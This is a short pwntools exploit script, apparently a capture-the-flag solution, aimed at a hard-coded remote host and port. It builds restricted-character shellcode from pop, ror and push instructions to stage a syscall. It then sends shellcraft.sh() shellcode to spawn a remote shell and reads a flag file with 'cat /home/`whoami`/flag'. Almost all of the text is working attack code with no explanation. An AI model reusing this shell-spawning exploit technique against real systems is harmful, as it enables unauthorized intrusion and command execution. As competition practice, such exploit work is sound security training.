#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

host = '210.61.46.46'
port = 444
y = remote( host , port )

p = asm( 'pop rax' ) * 2
p += asm( 'pop rsp' )
p += asm( 'pop rax' ) * ( 0x400 / 8 )

p += asm( 'mov rax, 0x909090909090143c' )   # 05 0f syscall
p += asm( 'ror ah,1' ) * 2                  # set 0x05 : 0x14 ror 2 -> 0x05
p += asm( 'ror al,1' ) * 2                  # set 0x0f : 0x3c ror 2 -> 0x0f
p += asm( 'push rax' )                      # push it to shellcode

p += asm( 'mov rax, 0x909090905858b4b4' ) + asm( 'ror ah, 1' ) + asm( 'ror al, 1' ) + asm( 'push rax' )
p += ( asm( 'mov rax, 0x909090909090b4b4' ) + asm( 'ror ah, 1' ) + asm( 'ror al, 1' ) + asm( 'push rax' ) ) * 10

p += asm( 'mov rax, 0x909090909090bc54' )  # 0x5e pop rsi : 0xbc ror 1 -> 0x5e
p += asm( 'ror ah, 1' )
p += asm( 'push rax' )

y.send( p.ljust( 0x440 , asm( 'nop' ) ) + '\x10\x10\x10\x10' ) # read syscall

y.send( '\x90' * 0x100 +  asm( shellcraft.sh() ) ) # shellcode

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()